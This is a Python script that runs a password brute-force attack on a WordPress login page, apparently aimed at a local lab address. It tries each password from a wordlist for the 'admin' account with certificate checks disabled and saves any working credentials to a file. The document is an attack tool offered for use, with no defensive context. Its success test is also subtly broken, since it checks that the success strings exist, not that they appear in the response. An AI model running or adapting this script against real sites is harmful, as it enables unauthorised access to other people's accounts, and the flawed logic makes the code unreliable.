import requests
import threading
import urllib3
from colorama import Fore

COLOR_RESET = Fore.RESET
COLOR_RED = Fore.RED
COLOR_YELLOW = Fore.YELLOW
COLOR_GREEN = Fore.GREEN
COLOR_CYAN = Fore.CYAN

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# CONFIGURATIONS
succMsg = ["Dashboard", "Settings", "Appearance", "Plugins"]
errorMsg = "The password you entered for the username"
userKey = "log"
passKey = "pwd"
wps_username = "admin"

# Define Target URL and Login Endpoint
URL = "http://127.0.0.150/wp-login.php"



# Function to handle login with the given URL, username, and password
def login_to_site(url, username, password, user_key, pass_key, success_msg: list, error_msg):
    session = requests.Session()
    try:
        login_page = session.get(url, verify=False)
       
        payload = {
            f'{user_key}': username,
            f'{pass_key}': password,
        }

        login_response = session.post(url, data=payload, verify=False)
        
        if success_msg[0] and  success_msg[1] and success_msg[2] and success_msg[3] and not error_msg in login_response.text:
            print(f'{COLOR_GREEN}[*] Login successful for {COLOR_YELLOW}{username}{COLOR_GREEN} at {url} with password: {COLOR_CYAN}{password}{COLOR_RESET}')
            # with open('inspect.html', 'a') as resz:
            #     resz.write(str(login_response.text))
            # Write successful logins to a file
            with open('success.txt', 'a') as good_output_file:
                good_output_file.write(f'{url}|{username}|{password}\n')
            return True
        else:
            # debugging:
            # with open('resz.html', 'a') as resz:
            #     resz.write(str(login_response.text))
            print(f'{COLOR_RED}[x] Login failed for {COLOR_YELLOW}{username}{COLOR_RED} at {url} with password: {COLOR_YELLOW}{password}{COLOR_RESET}')
    except Exception as e:
        print(f'Error occurred for {url}: {e}')


# Function to handle processing each line of the file
def process_lines(filename, url, username, puser_key, ppass_key, psuccess_msg: list, perror_msg):
    crackingStatus = False
    try:
        with open(filename, 'r') as file:
            for line in file:
                # try:
                    # username, password = line.strip().split('|')
                password = line.strip()
                # except Exception as e:
                    # print(f"Splitting Error: {e}")
                crackingStatus = login_to_site(url, username, password, puser_key, ppass_key, psuccess_msg, perror_msg)
                if crackingStatus:
                    break
            if not crackingStatus:
                print(f"{COLOR_YELLOW}PASSWORD{COLOR_RED} NOT FOUND!!!.{COLOR_RESET}")

    except FileNotFoundError:
        print(f"{COLOR_RED}File not found. Please provide a valid filename.{COLOR_RESET}")

# Get the filename from the user
filename = input(f"{COLOR_YELLOW}Enter the filename to password data from: {COLOR_RESET}")

# Create a thread for processing lines from the file
processing_thread = threading.Thread(target=process_lines, args=(filename, URL, wps_username, userKey, passKey, succMsg, errorMsg, ))
processing_thread.start()

